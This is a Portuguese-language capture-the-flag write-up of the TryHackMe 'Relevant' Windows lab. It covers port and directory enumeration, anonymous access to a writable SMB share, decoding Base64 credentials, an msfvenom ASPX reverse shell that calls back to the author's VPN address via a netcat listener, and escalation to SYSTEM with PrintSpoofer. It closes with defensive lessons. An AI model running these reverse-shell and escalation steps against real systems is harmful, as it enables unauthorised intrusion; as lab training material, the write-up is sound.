---
title: "Relevant"
date: 2026-06-27
summary: "Exploração de compartilhamento SMB gravável e escalada no Windows por impersonação de token."
platform: "TryHackMe"
difficulty: "Média"
os: "Windows"
tags: ["SMB", "IIS", "PrintSpoofer", "Token Impersonation"]
draft: false
---

## Visão Geral

A máquina Relevant é um desafio de nível intermediário que simula um teste de penetração em ambiente Windows sem conhecimento prévio da infraestrutura (*black box*). O objetivo é explorar uma configuração incorreta de compartilhamento **SMB** para obter execução remota de código e, em seguida, abusar do privilégio `SeImpersonatePrivilege` para escalar para `NT AUTHORITY\ SYSTEM`.

O caminho de exploração envolve três etapas principais: enumeração de portas não convencionais, descoberta de um compartilhamento SMB anônimo e gravável que espelha um diretório do servidor web, e escalada de privilégios via *token impersonation* com o **PrintSpoofer**.

## Reconhecimento

### Varredura de Portas

Como o enunciado do desafio orienta a tratar a máquina como uma avaliação de caixa preta, a primeira ação foi realizar uma varredura completa de todas as 65.535 portas TCP para não perder serviços em portas não convencionais.

*Varredura completa de portas com Nmap*
```bash
nmap -p- -sV -sC -T4 relevant.thm
```

A varredura revelou as seguintes portas abertas:

- **Porta 80**: HTTP --- Microsoft IIS 10.0
- **Porta 135**: MSRPC
- **Porta 139**: NetBIOS-SSN (SMB)
- **Porta 445**: Microsoft-DS (SMB)
- **Porta 3389**: RDP --- Microsoft Terminal Services
- **Porta 49663**: HTTP --- Microsoft IIS 10.0 (segunda instância)
- **Porta 49666**: MSRPC
- **Porta 49668**: MSRPC


![Resultado da varredura completa do Nmap mostrando as portas abertas.](/images/writeups/relevant/nmap-relevant.png)

O ponto mais relevante foi a existência de **dois servidores IIS**: um na porta padrão 80 e outro na porta não convencional **49663**. Isso é um indicativo importante de que pode haver conteúdo diferente servido na segunda instância.

### Enumeração Web

Ao acessar a porta 80 pelo navegador, a página padrão do IIS 10.0 era exibida, sem nenhum conteúdo customizado. Para mapear a estrutura do servidor web em ambas as instâncias do IIS (portas 80 e 49663), foi executado um scan com a ferramenta **DirBuster**.

*Enumeração de diretórios*
```bash
feroxbuster -u http://relevant.thm:49663/ -w /usr/share/wordlists/dirb/common.txt -x aspx,txt -t 50
```

Enquanto a varredura na porta 80 não revelou caminhos de interesse, a varredura na porta 49663 confirmou que o diretório `/nt4wrksv/` estava acessível via HTTP. O foco foi então deslocado para a enumeração inicial do serviço **SMB**.

![Resultado da varredura do Feroxbuster.](/images/writeups/relevant/ferox-relevant.png)

## Exploração Inicial

### Enumeração do SMB

Utilizei o **smbclient** para listar os compartilhamentos disponíveis sem fornecer credenciais (acesso anônimo).

*Listagem de compartilhamentos SMB anônimos*
```bash
smbclient -L // relevant.thm / -N
```

O comando retornou quatro compartilhamentos. Além dos compartilhamentos administrativos padrão do Windows (`ADMIN$`, `C$`, `IPC$`), havia um compartilhamento não padrão chamado **nt4wrksv**, que podia ser acessado anonimamente.

*Acesso anônimo ao compartilhamento nt4wrksv*
```bash
smbclient // relevant.thm /nt4wrksv -N
```

Dentro do compartilhamento, encontrei um arquivo chamado `passwords.txt`.

*Download do arquivo de senhas encontrado no SMB*
```bash
smb: \> get passwords.txt
```

### Decodificação das Credenciais

O conteúdo do `passwords.txt` estava codificado em **Base64**. Decodifiquei as strings para obter pares de credenciais em texto claro.

*Decodificação das strings Base64 do arquivo de senhas*
```bash
echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
# Saida: Bob - !P@$$W0rD!123

echo "QmlsbCAtIEp1dzRubmFNNG44NzY1NDMh" | base64 -d
# Saida: Bill - Juw4nnaM4n876543!
```

Obtive dois pares de credenciais: `Bob` com a senha `!P@$$W0rD!123` e `Bill` com a senha `Juw4nnaM4n876543!`. Tentei usar essas credenciais para acessar o RDP e outros serviços, mas sem sucesso. Elas funcionam como referência, mas não são o vetor de ataque principal.

### Ponto de Execução

Como descoberto na fase de reconhecimento web (onde identificamos o diretório `/nt4wrksv/` na porta 49663), o compartilhamento SMB que acabamos de explorar servia seus arquivos diretamente pelo servidor web. Essa é uma configuração crítica que conectava os dois vetores de ataque, permitindo que escrevêssemos via SMB e executássemos via HTTP.

### Criação e Upload do Webshell

Com a escrita no SMB e a execução via HTTP confirmadas, criei um *payload* de *reverse shell* em formato **ASPX** usando o **msfvenom**.

*Geração do payload ASPX com msfvenom*
```bash
msfvenom -p windows/x64/shell_reverse_tcp \
LHOST=<MEU_IP_VPN> LPORT=4444 \
-f aspx -o shell.aspx
```

Em seguida, fiz o upload do arquivo `shell.aspx` diretamente para o compartilhamento SMB gravável.

*Upload do webshell via SMB*
```bash
smbclient // relevant.thm /nt4wrksv -N
smb: \> put shell.aspx
```

Antes de acionar o shell, abri um *listener* com o **Netcat** na minha máquina de ataque para receber a conexão de retorno.

*Inicializando ouvinte para receber o reverse shell*
```bash
nc -lnvp 4444
```

Por fim, requisitei o arquivo pelo navegador para executar o *payload* no servidor.

*Acionamento do webshell via requisição HTTP*
```bash
curl http://relevant.thm:49663/nt4wrksv/shell.aspx
```

O *listener* recebeu a conexão e obtive um shell como o usuário `iis apppool\ defaultapppool`.

Nesse ponto, já foi possível capturar a *flag* de usuário em `C:\ Users\ Bob\ Desktop\ user.txt`.

## Escalada de Privilégios

### Identificação do Vetor

Com o shell em mãos, executei o comando `whoami /priv` para verificar os privilégios do usuário atual.

*Verificação dos privilégios do usuário atual*
```bash
whoami /priv
```

O resultado mostrou que o `SeImpersonatePrivilege` estava **habilitado**. Esse privilégio é concedido a contas de serviço do IIS para que possam representar clientes em operações autenticadas. No entanto, ele também pode ser abusado por um atacante para impersonar tokens de usuários privilegiados e escalar para `NT AUTHORITY\ SYSTEM`.

### Exploração com PrintSpoofer

A ferramenta **PrintSpoofer** explora o serviço de *Print Spooler* do Windows para forçar o sistema a se autenticar contra um *named pipe* controlado pelo atacante. Como o serviço roda como SYSTEM, o token capturado possui privilégios máximos, e o `SeImpersonatePrivilege` permite ao nosso processo utilizá-lo para abrir um shell com permissões totais.

Fiz o download do executável `PrintSpoofer64.exe` na minha máquina de ataque e o transferi para o alvo usando o mesmo compartilhamento SMB.

*Upload do PrintSpoofer via compartilhamento SMB*
```bash
# Na maquina de ataque:
smbclient // relevant.thm /nt4wrksv -N
smb: \> put PrintSpoofer64.exe
```

Com o binário no servidor, executei-o a partir do shell reverso para obter um prompt interativo como SYSTEM.

*Execução do PrintSpoofer para escalada de privilégios*
```bash
C:\inetpub\wwwroot\nt4wrksv\PrintSpoofer64.exe -i -c cmd
```

A escalada foi bem-sucedida. Com acesso total ao sistema, naveguei até o desktop do Administrador e coletei a *flag* de root.

*Captura da flag de root*
```bash
type C:\Users\Administrator\Desktop\root.txt
```

## Conclusão

A máquina Relevant{} demonstra como a combinação de duas configurações incorretas aparentemente independentes pode resultar em um comprometimento total do sistema. O compartilhamento SMB gravável, por si só, não seria fatal se não estivesse espelhado em um servidor web capaz de executar código `.aspx`. Da mesma forma, o `SeImpersonatePrivilege` é um privilégio comum em contas de serviço do IIS, mas, em mãos erradas, representa uma porta de entrada direta para o `SYSTEM`.

Os principais aprendizados desta máquina são:

- **Varredura de todas as portas é obrigatória**: A porta 49663 seria facilmente ignorada em uma varredura padrão, e com ela toda a cadeia de exploração se perderia.
- **Compartilhamentos SMB anônimos são críticos**: Nunca se deve permitir acesso de escrita anônimo a diretórios que possam ser acessados pelo servidor web. Isso transforma o servidor em uma plataforma de execução de código para qualquer atacante não autenticado.
- **Credenciais em texto claro no servidor**: O arquivo `passwords.txt` codificado em Base64 não oferece nenhuma proteção real. Base64 é codificação, não criptografia.
- **Controle de privilégios de conta de serviço**: O privilégio `SeImpersonatePrivilege` deve ser monitorado de perto. Quando possível, use contas com o mínimo de privilégios necessário e desative o serviço de *Print Spooler* em servidores que não o necessitam.


## Referências

- TryHackMe. *Relevant --- Penetration Testing Challenge*. Disponível em: <https://tryhackme.com/room/relevant>
- itm4n. *PrintSpoofer --- Abusing Impersonation Privileges on Windows 10 and Server 2019*. Disponível em: <https://github.com/itm4n/PrintSpoofer>
- HackTricks. *Windows Privilege Escalation --- SeImpersonatePrivilege*. Disponível em: <https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens>
- Offensive Security. *MSFvenom Cheat Sheet*. Disponível em: <https://www.offensive-security.com/metasploit-unleashed/msfvenom/>
- Samba Team. *smbclient --- ftp-like client to access SMB/CIFS resources*. Disponível em: <https://www.samba.org/samba/docs/current/man-html/smbclient.1.html>
